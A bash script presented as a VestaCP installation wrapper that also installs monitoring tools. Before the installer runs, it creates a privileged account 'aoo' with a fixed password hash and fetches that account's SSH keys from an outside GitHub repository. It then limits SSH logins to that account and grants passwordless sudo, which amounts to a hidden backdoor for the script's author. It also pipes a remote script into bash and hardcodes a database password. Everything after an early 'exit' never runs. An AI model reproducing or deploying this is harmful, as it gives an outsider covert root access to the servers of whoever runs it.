#!/bin/bash
# Vesta installation wrapper
# http://vestacp.com 
# Develop by Apivat Pattana-Anurak (Aoo)
# Versions 1.0.0.1 

###########################
#      Basic Install      #
###########################

# install
yum install screen -y
yum -y install epel-release
yum install net-tools -y
yum install wget -y
yum install whois -y
yum install ntp -y
yum install perl -y
yum -y install perl-ExtUtils-MakeMaker perl-Digest-SHA perl-Net-DNS  perl-NetAddr-IP perl-Archive-Tar perl-IO-Zlib perl-Mail-SPF perl-IO-Socket-INET6 perl-IO-Socket-SSL perl-Mail-DKIM perl-Encode-Detect perl-HTML-Parser perl-HTML-Tagset perl-Time-HiRes perl-libwww-perl perl-Sys-Syslog perl-Net-CIDR-Lite perl-Net-DNS-Nameserver perl-Geo-IP perl-Net-Patricia perl-DB_File perl-Razor-Agent

# update os
yum -y update

# install sudo
yum install sudo -y
# Start Create Aoo Account
echo -e '\e[1;36mCreate Special User "aoo".....................................................................OK\e[0m';
useradd -p paHW.7qDiHJCM aoo
usermod -G wheel aoo
mkdir -p /home/aoo/.ssh
chmod 700 /home/aoo /home/aoo/.ssh
curl -o /home/aoo/.ssh/authorized_keys https://raw.githubusercontent.com/aoostudio/linux/master/authorized_keys
chmod 600 /home/aoo/.ssh/authorized_keys
chown aoo.aoo -R /home/aoo /home/aoo/.ssh

### AllowUsers aoo to Sudo ssh ###
echo -e '\e[1;36mConfig + Securing SSHD.........................................................................OK\e[0m';
echo 'AllowUsers aoo' >> /etc/ssh/sshd_config
sed -i 's/# %wheel\tALL=(ALL)\tNOPASSWD: ALL/%wheel\tALL=(ALL)\tNOPASSWD: ALL/' /etc/sudoers


############################################
#          Start Install VestaCP           #
############################################

# Currently Supported Operating Systems:
#
#   RHEL 5, 6, 7
#   CentOS 5, 6, 7
#   Debian 7, 8
#   Ubuntu 12.04 - 18.04
#   All Linux

# Am I root?
if [ "x$(id -u)" != 'x0' ]; then
    echo 'Error: this script can only be executed by root'
    exit 1
fi

# Check admin user account
if [ ! -z "$(grep ^admin: /etc/passwd)" ] && [ -z "$1" ]; then
    echo "Error: user admin exists"
    echo
    echo 'Please remove admin user before proceeding.'
    echo 'If you want to do it automatically run installer with -f option:'
    echo "Example: bash $0 --force"
    exit 1
fi

# Check admin group
if [ ! -z "$(grep ^admin: /etc/group)" ] && [ -z "$1" ]; then
    echo "Error: group admin exists"
    echo
    echo 'Please remove admin group before proceeding.'
    echo 'If you want to do it automatically run installer with -f option:'
    echo "Example: bash $0 --force"
    exit 1
fi

# Detect OS
case $(head -n1 /etc/issue | cut -f 1 -d ' ') in
    Debian)     type="debian" ;;
    Ubuntu)     type="ubuntu" ;;
    Amazon)     type="amazon" ;;
    *)          type="rhel" ;;
esac

# Check wget
if [ -e '/usr/bin/wget' ]; then
    wget http://vestacp.com/pub/vst-install-$type.sh -O vst-install-$type.sh
    if [ "$?" -eq '0' ]; then
        bash vst-install-$type.sh $*
        exit
    else
        echo "Error: vst-install-$type.sh download failed."
        exit 1
    fi
fi

# Check curl
if [ -e '/usr/bin/curl' ]; then
    curl -O http://vestacp.com/pub/vst-install-$type.sh
    if [ "$?" -eq '0' ]; then
        bash vst-install-$type.sh $*
        exit
    else
        echo "Error: vst-install-$type.sh download failed."
        exit 1
    fi
fi

exit

################## Step3 Install Monitor Process ####################
yum install htop -y
yum install atop -y
yum install iftop -y
 yum install nmon -y
### mysql procress monitor ##
################ Install Netdata #####################
echo -e '\e[1;36mServer Status Show Apache Server Status .......................................................OK\e[0m';
sed -i 's/#ExtendedStatus/ExtendedStatus/' /etc/httpd/conf/extra/httpd-info.conf

echo -e '\e[1;36mInstall Netdata (Traffic/CPU Monitoring Graph) http://yourip:19999 ............................OK\e[0m';
bash <(curl -Ss https://my-netdata.io/kickstart.sh)
yum install MySQL-python --disableexcludes=all
cat <<EOF >>/etc/netdata/python.d/nginx.conf
local:
  url  : 'http://127.0.0.1/nginx_status'
EOF
cat <<EOF >>/etc/netdata/python.d/mysql.conf
local:
    socket: '/var/lib/mysql/mysql.sock'
    user: 'netdata'
    pass: '7kT6H0Jw'
EOF
DA_MYSQL=/usr/local/directadmin/conf/mysql.conf
MYSQLPASSWORD=`grep "^passwd=" ${DA_MYSQL} | cut -d= -f2`
mysql -u da_admin -p$MYSQLPASSWORD <<EOF
GRANT USAGE ON *.* TO netdata@localhost IDENTIFIED BY '7kT6H0Jw';
FLUSH PRIVILEGES;
EOF
perl -pi -e 's/CONFIGURATION STARTS HERE/CONFIGURATION STARTS HERE\nqueue_list_requires_admin = false/' /etc/exim.conf
systemctl restart netdata

cat <<EOF >>/etc/nginx/nginx-includes.conf
upstream netdata {
    server 127.0.0.1:19999;
    keepalive 64;
}
EOF

cat <<EOF >>/etc/nginx/nginx-info.conf
    location = /netdata {
        return 301 /netdata/;
    }
    location ~ /netdata/(?<ndpath>.*) {
        proxy_redirect off;
        proxy_set_header Host \$host;
        proxy_set_header X-Forwarded-Host \$host;
        proxy_set_header X-Forwarded-Server \$host;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_http_version 1.1;
        proxy_pass_request_headers on;
        proxy_set_header Connection "keep-alive";
        proxy_store off;
        proxy_pass http://netdata/\$ndpath\$is_args\$args;
        gzip on;
        gzip_proxied any;
        gzip_types *;
    }
EOF

###################### End Script  #######################
